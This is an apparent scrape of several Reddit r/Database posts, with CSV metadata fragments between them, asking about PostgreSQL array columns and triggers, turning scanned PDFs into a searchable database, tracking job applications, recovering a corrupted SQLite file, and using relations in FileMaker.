So the approach I am looking at taking is to start from a normalized journal_entry and journal_line table and then attach an array of journal_line items to journal_entry.  I can then model the running total as a ""table method"" and then break out the data using a trigger.  In this way data would be entered into the journal_entry table, and this would include an array of line items, which would then get stored (and checked semi-declaratively) and then broken out into the journal_line table using a trigger.  PostgreSQL is kind of funny regarding column constraints where a table is used as a column type, so this has the nice side effect of also checking the column constraints properly too.

So I see the obvious costs:  creating the appropriate insert statement is programatically harder and altering the journal_line table is going to be harder in PostgreSQL.  However, the data would be queried in other ways.  Additionally since only functional dependencies are initially in the collection table, it doesn't seem to me that we are introducing additional insert anomilies.

So my question is:

If we go this route, what are the other costs to doing things in this way?",,False,self,t5_2qian,False,,,True,t3_zyh2e,http://www.reddit.com/r/Database/comments/zyh2e/question_about_violating_1nf_on_postgresql/,

Here's the deal: I have a ton of data, housed in PDF form, gathered across 40 or so CDs. The data is scanned records from my dad's old consulting and research company and I'd like to create a searchable database of the info.
A massive amount of the data is in a standardized format, and almost everything was typed - not hand written. 

If I were to guess, I'd say about 90% is ""standardized"". I can deal with the non-standard stuff later, if need be. I had the paper files pulled from over 50 file cabinets and scanned about 6 years ago by a file digitizing company. The first 10 pages from each file follow an identical format... the remaining pages (some files larger then others) are typed notes relating to specific projects... mostly done my the same transcription team, so there's a rough common format across them all.

I'd like to call upon oDesk (or similar) to hire a database developer that will create a system where I can just dump the files in and then have some sort of search and analyze capability. I envision something where I can put in my desired criteria and the database spits out documents and aggregated information matching my interest.

For example: I want to find out how many companies my dad worked with in Los Angeles, their industry and average amount of money earned per project. I also want to see each related file.
The data's there... it's just in thousands of PDFs! Certainly it's possible to do this sort of thing. Right?
So... I have no clue what database setup I'm looking for, and I'm afraid of wasting time and money through trial and error. That's where you come in!

Question 1: Any thoughts as to what database format I should target (SQL, Oracle, FileMaker, etc.)

Question 2: Is it even possible for me to have a database search and aggregate information that's locked in scanned PDF files? If so, I assume I need to OCR everything, right?

Question 3: can I run the data and search through a website so I'm not tied down to any one computer?

Question 4: The data's on CDs... do I need to buy my own servers for the database framework and the data? Or, can I send it to the cloud?

Help me, Reddit. You're my only hope.

Calling all database/site/software gurus to answer a few questions.,7,4,4,http://www.reddit.com/r/Database/comments/rok9v/setting_up_a_database_to_track_job_applications/,"Hi, I'm posting here on the suggestion of a helpful fellow Redditor:

I'm in full-on job-hunting mode and am finding that, in light of the fact that I am forced to use many different job boards, I am quickly approaching to point at which I will no longer be able to track which jobs I have applied to and when, at least without the by-hand tracking I'm doing becoming a huge time-suck in itself.

I did a little searching, and it seems that there have been some attempts to create a ""job application tracker"" (see applymate.com and gigcart.com), but neither of these are full-featured enough to provide the sort of organization I am looking for.

More specifically, each of these offerings has a nice featured the other doesn't and neither is able to do do a few things I would think are essential. For example, GigCart makes good use of ""tagging"" so that I can easily search across entries later, but otherwise doesn't have a good at-a-glance dashboard showing the status of applications. Applymate has just such a dashboard - listing out the applications entries I've made and allowing for sorts by ""in process"", ""completed"", ""awaiting interview"", or ""rejected"" and the like - but it otherwise lacks any tagging feature. Neither site, sadly, allows the uploading of documents in order to attach to any particular entry - something I absolutely need because I tailor my resume and cover letter, sometimes drastically, for each job I apply for.

Do you guys know of any available site or database application that either already provides for what I am looking for, or can be retooled/configured relatively easily to be able to do what I want?

A big thanks in advance for any insight, recommendations and the like you can provide!!!!

tl;dr: applying for jobs and want a database to track the applications as well as archive the documents submitted for each. Applymate.com and Gigcart.com are nice attempts, but not sufficient. Seeking advice for website/software that either already does or can be easily configed to do so.

I have a database thats been corrpted, and want to save so much of the data possible.

I have tried sql dump the data with numerous of tools, without success.
Always same error message:  

    Error: database disk image is malformed

I'm pretty sure this did happen due to a power failure.

**Approach?**

Now the the database is in fact a file. And I'm thinking if its possible to treat it so and try to save so much data as possible.

I guessing when the db is opened by a tool or program it first check its headers.
In my case I get the error message right away. I'm assuming that the headers are corrupt, or miss matching. And due to that no tool will try to read the payload.

In the documents http://www.sqlite.org/fileformat2.html there are explanations for the header offsets.

**Questions**: Is this is an reasonable approach? And if it possible to repair, modify or exchange headers on the corrupted db. And how do I do it?

That being said, I've been asked to re-create a db (originally created with Appleworks *insert lawlz*), and am working on educating myself on the ways of Filemaker Pro 11. So far things are going smoothly, I'm picking up the software rapidly, but something in the back of my head has been nagging me...

I have a basic concept of how dbs work, using relations to connect multiple table together, but why is it relations are used, and in what circumstances should they be used?

This question came to me when I was browsing over the original db and noticed all the fields are contained in one table. I was instantly taken back to my university db course, and felt that this couldn't be the correct way to build this db.

Any input you might be able to provide would be greatly appreciated.  I'm sure with time I'll find the explanation, but figured I post here first.",,False,self,t5_2qian,False,,,True,t3_psfvw,http://www.reddit.com/r/Database/comments/psfvw/a_noob_with_a_question/,
